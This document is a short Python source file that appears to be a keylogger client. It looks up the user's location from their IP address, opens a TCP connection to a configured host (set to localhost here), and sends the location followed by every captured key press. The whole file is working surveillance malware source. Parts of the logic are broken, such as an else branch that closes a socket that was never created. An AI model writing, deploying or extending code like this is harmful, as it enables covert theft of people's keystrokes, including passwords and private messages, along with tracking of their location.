import socket
import geocoder
from pynput.keyboard import Listener
import time
CONN_HOST = "127.0.0.1"  # Standard loopback interface address (localhost)
CONN_PORT = 65432  # Port to listen on (non-privileged ports are > 1023) <[OK] Ipinfo - Geocode [Banská Bystrica, Banskobystrický kraj, SK]>
USER_GEOLOCATION = str(geocoder.ip('me'))

print(USER_GEOLOCATION[24:-2])

# TODO Rework this into a UDP connection
# Listens for key presses and sends them to the server
def start_keylogger(state: bool):
    print("Called the function")
    if state == True:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((CONN_HOST,CONN_PORT))
            s.send(bytes(USER_GEOLOCATION[24:-2], 'utf-8'))
            while True:
                time.sleep(0.1)
                def on_press(key):
                    string =f"{key}"
                    s.send(bytes(string, 'utf-8'))
                
                while True:
                    print("Starting logger.")
                    with Listener(on_press=on_press) as listener:
                        listener.join()
    else:
        s.shutdown(socket.SHUT_RDWR)
        s.close()
